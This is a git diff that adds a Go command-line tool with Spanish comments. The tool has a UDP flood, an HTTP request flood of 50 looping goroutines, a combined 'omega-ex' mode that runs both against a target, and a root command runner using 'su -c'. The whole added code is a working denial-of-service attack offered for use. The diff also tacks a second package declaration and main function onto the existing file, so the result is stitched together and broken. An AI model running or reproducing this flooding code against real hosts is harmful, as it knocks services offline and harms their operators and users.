@@ -219,3 +219,88 @@ func main() {
 		fmt.Printf("[L-SYSTEM] Unknown: %s\n", command)
 	}
 }
+package main
+
+import (
+	"fmt"
+	"net"
+	"net/http"
+	"os"
+	"os/exec"
+	"strings"
+	"time"
+	"crypto/rand"
+)
+
+// Generador de basura aleatoria para bypass de firewalls
+func randomPayload(size int) []byte {
+	payload := make([]byte, size)
+	rand.Read(payload)
+	return payload
+}
+
+// [L-VAMPIRE] Drenaje de recursos RAM/Net
+func lDrain(target string) {
+	for i := 0; i < 50; i++ {
+		go func() {
+			for {
+				resp, err := http.Get("http://" + target)
+				if err == nil { resp.Body.Close() }
+			}
+		}()
+	}
+}
+
+// [L-UDP-FLOOD] Inundación de capa 4
+func udpFlood(target string) {
+	addr, _ := net.ResolveUDPAddr("udp", target+":80")
+	conn, _ := net.DialUDP("udp", nil, addr)
+	for {
+		conn.Write(randomPayload(1024))
+	}
+}
+
+// Módulo de Ejecución de Comandos (Linux/Root)
+func systemExec(isRoot bool, name string, args []string) {
+	var cmd *exec.Cmd
+	if isRoot {
+		fullCmd := name + " " + strings.Join(args, " ")
+		cmd = exec.Command("su", "-c", fullCmd)
+	} else {
+		cmd = exec.Command(name, args...)
+	}
+	out, err := cmd.CombinedOutput()
+	if err != nil { fmt.Printf("[L-ERROR] %v\n", err) }
+	fmt.Print(string(out))
+}
+
+func main() {
+	if len(os.Args) < 2 { return }
+	command := os.Args[1]
+
+	switch command {
+	case "flood", "attack":
+		if len(os.Args) < 3 { return }
+		fmt.Printf("[L] INITIATING FLOOD ON %s...\n", os.Args[2])
+		go udpFlood(os.Args[2])
+		select {}
+
+	case "omega-ex":
+		if len(os.Args) < 3 { return }
+		fmt.Printf("[L] PROTOCOL OMEGA-EX ACTIVE ON %s\n", os.Args[2])
+		go udpFlood(os.Args[2])
+		go lDrain(os.Args[2])
+		select {}
+
+	case "nmap", "whois", "ping", "ifconfig", "ls":
+		// Ejecuta herramientas internas de auditoría
+		systemExec(false, "busybox", os.Args[1:])
+
+	case "root-exec":
+		if len(os.Args) < 3 { return }
+		systemExec(true, os.Args[2], os.Args[3:])
+
+	default:
+		fmt.Printf("[L-SYSTEM] Command not recognized: %s\n", command)
+	}
+}
